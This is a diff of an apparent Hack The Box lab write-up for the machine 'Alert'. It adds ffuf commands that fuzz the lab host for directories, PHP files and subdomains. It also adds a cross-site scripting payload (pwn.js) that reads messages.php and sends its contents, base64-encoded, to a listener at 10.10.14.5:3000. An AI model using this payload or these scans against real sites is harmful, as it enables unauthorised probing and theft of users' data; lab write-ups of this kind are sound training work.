@@ -1,6 +1,6 @@
 # Alert
 
-!!! Note "Enumeration"
+???+ Note "Enumeration"
 
     === ":octicons-codespaces-16: Port Scanning"
 
@@ -59,3 +59,42 @@
 
             We obtain the services *ssh* (port 22) and **http** (port 80) running, we can proceed analizing the http service on a browser.
 
+
+???+ Example "Fuzzing Web"
+
+    === ":octicons-browser-16: Look for directories"
+
+        ``` bash
+        ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u "http://alert.htb/FUZZ" -ic
+        ``` 
+    
+    === ":octicons-browser-16: Look for php files"
+
+        ``` bash
+        ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u "http://alert.htb/FUZZ" -ic -e .php
+        ```
+
+    === ":octicons-browser-16: Look for subdomains"
+
+        ``` bash
+        ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -H "http://FUZZ.alert.htb/" -u http://alert.htb
+        ```
+    === ":octicons-browser-16: Look for subdomains filtering"
+
+        ``` bash
+        ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -H "http://FUZZ.alert.htb/" -u http://alert.htb -fw 20
+        ```
+
+???+ Danger "Cross Site Scripting"
+
+    === ":octicons-file-code-16: pwn.js"
+
+        ``` js
+        var req = new XMLHttpRequest();
+        req.open('GET', 'http://alert.htb/messages.php', false);
+        req.send();
+
+        var req2 = new XMLHttpRequest();
+        req2.open('GET', 'http://10.10.14.5:3000/?content=' + btoa(req.responseText),true);
+        req2.send();
+        ```
